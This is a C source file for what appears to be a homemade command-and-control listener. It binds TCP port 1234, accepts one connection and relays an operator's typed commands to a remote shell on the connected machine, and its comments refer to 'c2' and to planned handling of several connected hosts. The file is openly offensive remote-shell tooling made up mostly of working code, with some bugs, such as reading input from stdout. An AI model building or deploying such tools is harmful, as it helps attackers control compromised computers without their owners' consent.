#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <limits.h>
#include <string.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define MAX_STR 256
#define MAX_TOK 16

#define port 1234
#define addr INADDR_ANY

char* tokenize(char*);

int main(int argc, char** arv){
  // set up socket to listen for incoming connection
  struct sockaddr_in host_addr;
  int host_sock = socket(AF_INET, SOCK_STREAM, 0);
  host_addr.sin_family = AF_INET;
  host_addr.sin_port = htons(port);
  host_addr.sin_addr.s_addr = addr;
  bind(host_sock, (struct sockaddr *)&host_addr, sizeof(host_addr));
  listen(host_sock, 0);
  
  // accept incoming connection
  int fd = accept(host_sock, NULL, NULL); // need to add functionality to listen for and accept multiple connections
  
  char str[MAX_STR] = {0};
  
  while(1){
    // terminal prompt
  loop:
    memset(str, 0, sizeof(str));
    write(1, str, sizeof(str));
    write(1, "$ ", 2);

    // read input
    int i = 0;
    memset(str, 0, sizeof(str));
    while(1){
      read(1, &str[i++], 1);
      if(i == MAX_STR && str[i-1] != '\n'){ // detect overflow
        write(1, "error: command length exceeds buffer size\n", 42);
        while(getchar() != '\n'){} // flush stdin
        goto loop;
      }
      if(str[i-1] == '\n'){
        if(i == 1) goto loop; // if only 'enter', restart loop
        str[i-1] = '\0'; // replace newline with null char
        break;
      }
    }

    // tokenize input
    i = 0;
    char** cmd_list = (char**)malloc(MAX_TOK * sizeof(char*));
    char* token = tokenize(str);
    while(token != NULL){
      cmd_list[i++] = token;
      token = tokenize(NULL);
    }

    // execute tokenized command(s)
    if(strcmp(cmd_list[0], "exit") == 0){
      exit(0); // system will clean up malloc'd mem
    }else if(strcmp(cmd_list[0], "list") == 0){
      // implement once handling of multiple connections is implemented
    }else if(strcmp(cmd_list[0], "connect") == 0){
      char tmp;

      while(1){
        // shell prompt from remote connection
        while(1){
          read(fd, &tmp, 1);
          if(tmp == '\0') break;
          write(1, &tmp, 1);
        }
        
        // local shell input
        while(1){
          read(0, &tmp, 1);
          write(fd, &tmp, 1);
          if(tmp == '\n') break;
        }
        
        // remote shell output
        while(1){
          read(fd, &tmp, 1);
	  if(tmp == '\a') goto exit;
          write(1, &tmp, 1);
          if(tmp == '\n') break; // c2 relies on a newline to be sent, progs like 'clear' do not do this
        }                        // should properly fix this later
      }
    }
  exit:
    close(fd);
    free(cmd_list);
  }
}

char* tokenize(char* str){
  char* token;
  static char* s;
  
  if(str == NULL && s == NULL){
    return NULL;
  }else if(str != NULL){
    s = str;
  }

  while(*s == ' '){
    ++s;
  }
  
  token = s;

  while(1){
    char c = *(s++);
    if(c == ' '){
      *(s-1) = 0x00;
      break;
    }else if(c == 0x00){
      s = NULL;
      break;
    }
  }
  return *token == 0x00 ? NULL : token;
}
